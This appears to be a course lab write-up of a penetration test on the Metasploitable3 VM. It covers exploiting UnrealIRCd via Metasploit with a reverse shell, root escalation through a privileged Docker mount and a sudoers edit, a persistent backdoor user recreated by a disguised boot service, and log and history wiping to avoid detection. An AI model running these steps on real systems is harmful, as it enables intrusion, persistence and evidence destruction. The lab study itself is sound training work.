---
icon: face-explode
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
---

# Unreal IRCD: Shell Access via Metasploit & Root via Docker

## <mark style="color:orange;">Vulnerability Analysis: Manual Analysis</mark>

On the intelligence gathering we performed on Metasploitable3 we found that the version of Unreal IRCD is 3.8.1 through banner grabbing.

```bash
┌──(kali㉿kali)-[~/Projects/Metasploitable3/IPT/scans]
└─$ nc -nv 172.16.16.131 6697

(UNKNOWN) [172.16.16.131] 6697 (ircs-u) open
:irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
:irc.TestIRC.net NOTICE AUTH :*** Couldn't resolve your hostname;
NICK Jj
USER Jj 0 * :Jj

:irc.TestIRC.net 001 Jj :Welcome to the TestIRC IRC Network Jj!Jj@172.16.16.240
:irc.TestIRC.net 002 Jj :Your host is irc.TestIRC.net, running version 
Unreal3.2.8.1
:irc.TestIRC.net 003 Jj :This server was created Thu Oct 29 2020 at 20:00:01 UTC
```

#### Searchsploit: Checking if this vulnerability is publicly available

<figure><img src="../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

#### **Exploit DB:** Checking if there are available codes for exploits for this vulnerability

<figure><img src="../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:orange;">Exploitation</mark>

Trying the publicly known exploit from Metasploit

1.  On a terminal type `msfdb init`



    <div align="left"><figure><img src="../../.gitbook/assets/image (151).png" alt="" width="563"><figcaption><p>The msfdb is already started in my case</p></figcaption></figure></div>
2.  Open by typing `msfconsole` and `search unreal ircd`&#x20;



    <div align="left"><figure><img src="../../.gitbook/assets/image (152).png" alt="" width="563"><figcaption></figcaption></figure></div>
3.  Select the exploit by typing `use 0`



    <div align="left"><figure><img src="../../.gitbook/assets/image (153).png" alt="" width="563"><figcaption></figcaption></figure></div>
4.  Type `show options` so that we can determine the requirement for this exploit



    <div align="left"><figure><img src="../../.gitbook/assets/image (154).png" alt="" width="563"><figcaption></figcaption></figure></div>
5.  We don't have a payload yet. We will add one by typing `show payloads`&#x20;



    <div align="left"><figure><img src="../../.gitbook/assets/image (155).png" alt="" width="563"><figcaption></figcaption></figure></div>
6.  We will use `payload/cmd/unix/reverse_perl` select this by typing `set payload 8`&#x20;



    <div align="left"><figure><img src="../../.gitbook/assets/image (156).png" alt="" width="512"><figcaption></figcaption></figure></div>
7.  Type `show options` again and fill the required parameters



    `set RHOSTS 172.16.16.131`

    `set LHOST 172.16.16.132`

    `set RPORT 6697`



    <div align="left"><figure><img src="../../.gitbook/assets/image (157).png" alt="" width="563"><figcaption></figcaption></figure></div>
8.  Once the parameters are entered type `exploit`



    <figure><img src="../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

We successfully gained shell access using a publicly known exploit, even though the vulnerability scan didn't reveal any service version. This is very alarming as it indicates that someone could guess hack a service using a publicly known exploit.

<div data-full-width="true"><figure><img src="../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure></div>

## <mark style="color:orange;">Post Exploitation</mark>

Now that we were able to gain a regular shell access, we will attempt to escalate our privileges

Based on the information we got earlier we can attempt utilizing the docker privileges `boba_fett` has on this server

1.  To make things comfortable for us type `shell` to gain an interactive shell.



    <div align="left"><figure><img src="../../.gitbook/assets/image (42).png" alt="" width="563"><figcaption></figcaption></figure></div>
2.  We will create a privileged docker container where we will mount one root file system folder **/etc** to the **/mnt/etc** folder of the container <br>

    `docker run -d --name container -v /etc:/mnt/etc --pid=host --privileged ubuntu sleep infinity`



    <figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
3.  Confirm that the container is running by typing `docker ps`&#x20;



    <figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
4.  Connect to the docker container and gain a root shell access

    `docker exec -it container /bin/bash`&#x20;



    <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
5.  Now we will now add **boba\_fett** as one of the **sudoers** on the parent machine via the container



    `echo “boba_fett ALL=(ALL:ALL) NOPASSWD:ALL” | tee /mnt/etc/sudoers.d`&#x20;



    <figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
6.  Type `exit` and switch to root using `sudo -i` . If your privilege escalation is successful, you should see the user `root@<metasploitable3 hostname>`



    <div align="left"><figure><img src="../../.gitbook/assets/image (51).png" alt="" width="563"><figcaption></figcaption></figure></div>

### Maintaining access

We can create a user under b0ba\_fett and add it to the **sudoers** with the following command

`useradd b0ba_fett`

`passwd b0ba_fett`

`usermod -aG sudo b0ba_fett`&#x20;

### Testing the b0ba\_fett ssh access

We can see that we were able to perform an SSH access using the **b0ba\_fett** user id with sudo access

<div align="left"><figure><img src="../../.gitbook/assets/image (160).png" alt="" width="563"><figcaption></figcaption></figure></div>

### Re-creating the user in case of deletion

We will create a check\_user.sh script and place it on unusual location such as /var/lib

`sudo nano /var/lib/check_user.sh`

```bash
#!/bin/bash

# Define the username and password
USERNAME="b0ba_fett"
PASSWORD="hacker"

# Check if the user exists and add to the sudo group
if id "$USERNAME" &>/dev/null; then
    sudo usermod -aG sudo "$USERNAME" > /dev/null 2>&1
else
    # Create the user without a home directory and set the password
    sudo useradd -M -s /bin/bash "$USERNAME" > /dev/null 2>&1
    echo "$USERNAME:$PASSWORD" | sudo chpasswd > /dev/null 2>&1
    sudo usermod -aG sudo "$USERNAME" > /dev/null 2>&1
fi
```

We will then tie this script to a service that check if this user exists at boot and re-create if deleted&#x20;

```
sudo nano /etc/init.d-health
```

```bash
#!/bin/sh
### BEGIN INIT INFO
# Provides:          sys-health
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Check and create user b0ba_fett if not exists
# Description:       Check and create user b0ba_fett if not exists
### END INIT INFO

SCRIPT="/var/lib/check_user.sh"
RUNAS=root

do_start() {
  $SCRIPT &
}

do_stop() {
  killall check_user.sh
}

case "$1" in
  start)
    do_start
    ;;
  stop)
    do_stop
    ;;
  restart)
    do_stop
    do_start
    ;;
  *)
    echo "Usage: $0 {start|stop|restart}"
    exit 1
    ;;
esac

exit 0

```

Change the permission of the service to make it executable\
`sudo chmod +x /etc/init.d/sys-health`&#x20;

Enable the service to start at boot

`sudo update-rc.d sys-health defaults`&#x20;

Start the service

`sudo service sys-health start`&#x20;

### Testing the service

1. Deleting b0ba\_fett user using `sudo userdel b0ba_fett`&#x20;
2.  Confirm that b0ba\_fett is indeed deleted using&#x20;

    `cat /etc/passwd | grep "b0ba_fett"`&#x20;



    <figure><img src="../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

    <div align="left"><figure><img src="../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure></div>
3.  From the msfconsole restart the machine by typing `sudo reboot -f`&#x20;



    <div align="left"><figure><img src="../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure></div>
4.  Once the server is up the service will check and re-create the **b0ba\_fett** user if missing. You should be able to ssh again to the target machine



    <div align="left"><figure><img src="../../.gitbook/assets/image (167).png" alt="" width="532"><figcaption></figcaption></figure></div>

## Clean up and clearing traces

After a successful penetration test, we need to restore the system to the state before we performed the test and delete logs as a form of courtesy to the system owner.

1.  Delete the check\_user.sh&#x20;

    `sudo rm -f /var/lib/check_user.sh`
2.  Delete the sys-health service

    `sudo rm -f /etc/init.d/sys-health`&#x20;
3.  Delete the b0ba\_fett user

    `sudo userdel b0ba_fett`&#x20;
4.  Delete the docker container "container"

    `docker stop container`

    `docker rm container`&#x20;
5.  Check if auditd if installed and clear the logs&#x20;

    `dpkg -l | grep auditd`

    `service auditd stop`&#x20;

    `rm -rf /var/log/audit/*`

    `service auditd start`&#x20;
6.  Overwriting system logs to avoid suspicion

    /var/log/auth.log → Records SSH logins and sudo activity. /var/log/syslog → Stores system events. /var/log/wtmp and /var/log/lastlog → Track login history.

    \
    `sudo service rsyslog stop`



    **Auth.log**

    `sudo truncate -s 0 /var/log/auth.log`

    `sudo echo -n "" > /var/log/auth.log`&#x20;



    **Syslog**

    `sudo truncate -s 0 /var/log/syslog`

    `sudo echo -n "" > /var/log/syslog`&#x20;



    **wtmp**

    `sudo truncate -s 0 /var/log/wtmp`

    `sudo echo -n "" > /var/log/wtmp`&#x20;



    **lastlog**

    `sudo truncate -s 0 /var/log/lastlog`

    `sudo echo -n "" > /var/log/lastlog`&#x20;



    Confirm that the logs are empty by issuing cat command to the following logs

    `sudo cat /var/log/auth.log`

    `sudo cat /var/log/syslog`

    `sudo cat /var/wtmp`

    `sudo cat /var/log/lastlog`&#x20;


7.  Delete the backdoor user

    `sudo userdel b0ba_fett -r`


8.  Clearing network traces

    `sudo iptables -F`

    `sudo iptables -X`


9.  Clear bash history

    `history -c`

    `echo > ~/.bash_history`

    `export HISTFILESIZE=0`

    `export HISTSIZE=0`

    `unset HISTFILE`&#x20;
10. &#x20;Overwritethe docker logs

    `sudo truncate -s 0 $(docker inspect --format='{{.LogPath}}' container)`

    `sudo sh -c "truncate -s 0 /var/lib/docker/containers/**/*-json.log"`&#x20;


11. Start the rsyslog service and remove the sudoer.d file for boba\_fett

    `sudo service rsyslog start`

    `sudo rm -rf /etc/sudoers.d/boba_fett`&#x20;


12. ~~Background the session and perform a post cleanup~~

    ~~`background`~~

    ~~`sessions -i`~~

    ~~`use post/linux/manage/clean_up`~~&#x20;

    Note: I am still confirming the availability of this module maybe may MSF Console is outdated during this writing
13. You can go ahead and exit out of the session

## <mark style="color:orange;">Reporting</mark>

After performing a successful penetration test, we can create a sample report that we can send to a client on this case to our imaginary client **Metasploitable 3**

{% file src="../../.gitbook/assets/Penetration Testing Report - Metasploitable3.pdf" %}

## <mark style="color:orange;">Summary</mark>

1. Pre-Engagement (Skipped)
2. Intelligence Gathering
3. Threat Modeling (Skipped)
4. Vulnerability Analysis
5. Exploitation
6. Post Exploitation
7. Reporting

This journey highlights my learning and growth throughout the Cybercrime Course. I appreciate any feedback or corrections to further improve my skills. Thank you for following along with my journey. Sending the utmost credits to my awesome trainer Doc Amos.\
\
&#xNAN;_"The journey of a thousand miles begins with a single step, but the path to mastery is paved with perpetual learning and relentless self-improvement."_ - Lao Tzu<br>

























